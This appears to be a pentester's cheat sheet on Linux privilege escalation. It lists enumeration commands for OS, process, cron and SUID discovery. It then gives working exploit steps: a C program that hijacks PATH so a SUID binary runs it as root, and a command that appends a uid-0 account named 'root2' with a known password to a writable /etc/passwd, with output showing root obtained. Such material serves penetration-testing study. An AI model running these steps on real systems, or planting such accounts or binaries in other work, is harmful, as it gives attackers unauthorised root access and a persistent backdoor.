# Linux PrivEsc

# Enumeration

**Manual Chech**

```shell
$ cat /etc/passwd
$ hostname

$ cat /etc/issue      #OS info
$ cat /etc/*-release  #OS info
$ uname -a            #OS info

$ ps aux  						#Running Processes

$ ip a								#Network info
$ /sbin/route 				#Routing Table
$ ss -anp							#Net Services + PID

$ ls -lah /etc/cron* #Cronjobs list
$ cat /etc/crontab   #Cronjobs for root

$ dpkg -l 					 #Installed Packages

$ find / -writable -type d 2>/dev/null  #Open for all files

$ cat /etc/fstab		#Mounted drives
$ mount							#Mounted drives
$ /bin/lsblk				#show available disks

$ lsmod							     #loaded kernel
$ /sbin/modinfo libata	 #kernel info about "libata"

$ find / -perm -u=s -type f 2>/dev/null  #search for SUID

$ grep "CRON" /var/log/cron.log  #search in CRON logs
$ 
$ 
```

**Automated Check**

[unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check/blob/1_x/unix-privesc-check)

```shell
./unix-privesc-check standard > output.txt
```







# Setuid and Setgid

##### How to find SETUID/SETGID files

```
find / -user apache -perm -4000 -exec ls -ld {} \;
find / -user root -perm -6000 -exec ls -ld {} \;
```

##### How to exploit

Search for available CVEs to the returned binaries, If not try to exploit one.

If the app are executing applications as root, debug the app and exploit like below app

```c
int main(int argc, char **argv) {
	system("ssh lol@lol.it");
	return 0;
}
```

To exploit that we need to create malicious app and set it's path at first of PATH 

```
export PATH=exp_path:${PATH}
```

the exploit app

```c
int main(int argc, char **argv) {
	setuid(0);
  setgid(0);
  seteuid(0);
  setegid(0);
	system("id && whoami");
	return 0;
}
```

`setuid(0);` because privileges gets dropped to EUID when calling system()



# /etc/passwd open to write

```bash
openssl passwd evil
echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
Password: evil
root@debian:/home/student# id uid=0(root) gid=0(root) groups=0(root)
```

